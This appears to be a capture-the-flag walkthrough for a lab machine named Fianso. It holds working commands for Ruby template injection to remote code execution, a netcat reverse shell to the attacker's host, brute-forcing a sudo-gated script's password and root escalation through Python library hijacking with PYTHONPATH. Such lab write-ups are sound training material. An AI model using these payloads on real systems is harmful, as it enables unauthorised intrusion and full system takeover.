---
title: Fianso
layout: default
---

## 1. Reconnaissance

### 1.1. Enumerate of the network

```bash
ifconfig
```

**OUTPUT**

```bash
ens160: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.0.103  netmask 255.255.255.0  broadcast 192.168.0.255
        inet6 fe80::f84f:aaf4:a787:c420  prefixlen 64  scopeid 0x20<link>
        ether 00:0c:29:0f:50:93  txqueuelen 1050  (Ethernet)
```

**Key points:**

- Networok Interface: `ens160`

```bash
arp-scan -I ens160 -lg
```

**OUTPUT**

```bash
192.168.0.105	08:00:27:e7:d7:62	PCS Systemtechnik GmbH
```

**Key points:**

- IP Machine: `192.168.0.105`

### 1.2. Scanning of Ports

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.0.105
```

**OUTPUT**

```bash
PORT     STATE SERVICE  REASON
22/tcp   open  ssh      syn-ack ttl 64
8000/tcp open  http-alt syn-ack ttl 64
```

**Key points:**

- `22/tcp open ssh`: This indicates that the SSH (Secure Shell) service is running on port 22.
- `8080/tcp open http`: This indicates that the alternative HTTP service (often used for web applications or custom services) is running in port 8000s
- `ttl 64`: Linux Machine

Go to `192.168.0.105`

![](/assets/images/Fianso.png)

When data is entered into the form it is processed by `POST`, and the result is displayed on the page:

![](/assets/images/Fianso-1.png)

![](/assets/images/Fianso-10.png)

## 2. Testing Vulnerabilities

I performed a Server-Side Template Injection (SSTI) test on a web application.

![](/assets/images/Fianso-2.png)

![](/assets/images/Fianso-4.png)

After testing several payloads, one of them worked correctly and managed to confirm the vulnerability, as obtained its computarized value

## 3. Explatation

When listing your web technology:

```bash
❯ whatweb http://192.168.0.105:8000
http://192.168.0.105:8000 [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[WEBrick/1.6.1 (Ruby/2.7.4/2021-07-07)], IP[192.168.0.105], Ruby[2.7.4,WEBrick/1.6.1], UncommonHeaders[x-content-type-options], X-Frame-Options[SAMEORIGIN], X-XSS-Protection[1; mode=block]
```

**Key points:** 
- Programming language: `Ruby`

### 3.1. Reverse Shell by RCE

As the site is developed with Ruby, I tried this payload that allows me to make a RCE.

```ruby
#{ %x|id| }
```

![](/assets/images/Fianso-5.png)

I got the data from the current user, that means I could try a Reverse Shell:

```ruby
#{ %x|nc -e /bin/bash 192.168.0.103 8888| }
```

![](/assets/images/Fianso-6.png)

![](/assets/images/Fianso-7.png)

I was successful in making the RS.

**FIRST FLAG**

![](/assets/images/Fianso-11.png)

I then sanitized the shell:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

## 4. Initial Access

### 4.1. List Permissions

List the `sofiane` user's permissions

```bash
sofiane@fianso:~$ sudo -l
Matching Defaults entries for sofiane on fianso:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User sofiane may run the following commands on fianso:
    (ALL : ALL) NOPASSWD: /bin/bash /opt/harness

sofiane@fianso:~$ cat /opt/harness
#! /bin/bash

clear -x
pass=$(</opt/passwordBox/password)
info="$(hostname):$(whoami):$pass" 
conf=/opt/config.conf

#touch & chmod & echo instead echo & chmod for race condition protection from user. 
touch $conf
chmod 700 $conf
echo $info > $conf

echo -e "\nAuthentication to manage music collection.\n"
echo -e "\n$(date "+Date: %D")\nUser: ${info:7:4}\nHost: ${info%%:*}\n"

read -ep "Master's password: " passInput
if [[ $passInput == $pass ]] ; then 
echo "sofiane ALL=(ALL:ALL) NOPASSWD:SETENV: /usr/bin/beet " >> /etc/sudoers 
echo -e "Sudo rights granted !\n"
else
echo -e "Wrong password\n" && exit 1
fi
```

```bash
sofiane@fianso:/opt$ ls -l
ls -l
total 8
-rw-r--r-- 1 root root  615 Dec 24  2022 harness
drwx------ 2 root root 4096 Dec 24  2022 passwordBox
```

According to the logic of the script, it must first be executed so that it can create the `config.conf`, in which the password will be registered, and then the script will write in `/etc/sudoers`.

```bash
sofiane@fianso:/opt$ sudo /bin/bash /opt/harness
'unknown': I need something more specific.

Authentication to manage music collection.


Date: 03/06/25
User: root
Host: fianso

Master's password: 

Wrong password

sofiane@fianso:/opt$ 
```

**Key points:** 
- Date: 03/06/25
- User: root
- Host: fianso

Now:

```bash
sofiane@fianso:/opt$ ls -l
ls -l
total 12
-rwx------ 1 root root   43 Mar  6 23:05 config.conf
-rw-r--r-- 1 root root  615 Dec 24  2022 harness
drwx------ 2 root root 4096 Dec 24  2022 passwordBox
sofiane@fianso:/opt$ 
```

The objective here is to decrypt the password stored in `config.conf`. The file is `43 bytes long` and the file is known to contain only this string: `$(hostname):$(whoami):$pass`:
- hostname → fianso → 6 bytes
- whoami → root → 4 bytes
- : → 1 byte (each one) → 2 bytes
- EOL → 1 byte (echo command for default add a `\n`)
**TOTAL:** 13 bytes → pass → 43 - 13 → 30 bytes

### 4.2. Cracking Password

Making use of `rockyou.txt` to crack the password, first extract all those with 30-byte characters.

```bash
❯ grep -oP "\b(\w{30})\b" /usr/share/wordlists/rockyou.txt | sudo tee rockyou_30.txt > /dev/null
```

Then I transferred this dictionary (`rockyou_30.txt`) to `sofiane`:

```bash
❯ python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

```bash
sofiane@fianso:/tmp$ wget "http://192.168.0.104/rockyou_30.txt"
wget "http://192.168.0.104/rockyou_30.txt"
--2025-03-06 23:47:32--  http://192.168.0.104/rockyou_30.txt
Connecting to 192.168.0.104:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10354 (10K) [text/plain]
Saving to: ‘rockyou_30.txt’

rockyou_30.txt      100%[===================>]  10.11K  --.-KB/s    in 0s      

2025-03-06 23:47:32 (29.8 MB/s) - ‘rockyou_30.txt’ saved [10354/10354]

sofiane@fianso:/tmp$ 
```

Making use of a bash statement, I tested each password in the `harness` script

```bash
while IFS= read -r pass; do
    echo -e "$pass" | sudo bin/bash /opt/harness
done < rockyou_30.txt
```

I typed the statement in one line in the terminal:

```bash
sofiane@fianso:/tmp$ while IFS= read -r pass; do echo -e "$pass" | sudo /bin/bash /opt/harness; done < rockyou_30.txt
```

Once the `/etc/sudoers` is written.

```bash
sofiane@fianso:/tmp$ sudo -l
sudo -l
Matching Defaults entries for sofiane on fianso:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User sofiane may run the following commands on fianso:
    (ALL : ALL) NOPASSWD: /bin/bash /opt/harness
    (ALL : ALL) SETENV: NOPASSWD: /usr/bin/beet
```

## 5. Privilege Escalation

The beet file was actually a python script:

```bash
sofiane@fianso:/tmp$ file /usr/bin/beet
/usr/bin/beet: symbolic link to ../share/beets/beet
sofiane@fianso:/tmp$ readlink -f /usr/bin/beet
/usr/share/beets/beet
sofiane@fianso:/tmp$ file /usr/share/beets/beet
/usr/share/beets/beet: Python script, ASCII text executable
sofiane@fianso:/tmp$
```

```bash
#!/usr/bin/python3
# EASY-INSTALL-ENTRY-SCRIPT: 'beets==1.4.9','console_scripts','beet'
__requires__ = 'beets==1.4.9'
import re
import sys
from pkg_resources import load_entry_point

if __name__ == '__main__':
    sys.argv[0] = re.sub(r'(-script\.pyw?|\.exe)?$', '', sys.argv[0])
    sys.exit(
        load_entry_point('beets==1.4.9', 'console_scripts', 'beet')()
    )
```

>[!Note]
>It is known that when you run a Python program that imports libraries, the first thing it does is to load those libraries. Taking advantage of this behavior, I created a new library called `re` designed to run a shell (`/bin/bash`) and gain interactive access. Then, I used the `beet` command to make sure that this custom library was the one loaded instead of the original `re` library by retyping `PYTHONPATH`.

```python
import os
os.system("/bin/bash -i")
```

```bash
sofiane@fianso:~$ echo -e "import os\nos.system(\"/bin/bash -i\")" > /tmp/re.py
```

```bash
sofiane@fianso:~$ sudo PYTHONPATH=/tmp /usr/bin/beet
```

I got a root shell:

```bash
root@fianso:~# ls
root.txt
```

**SECOND FLAG**
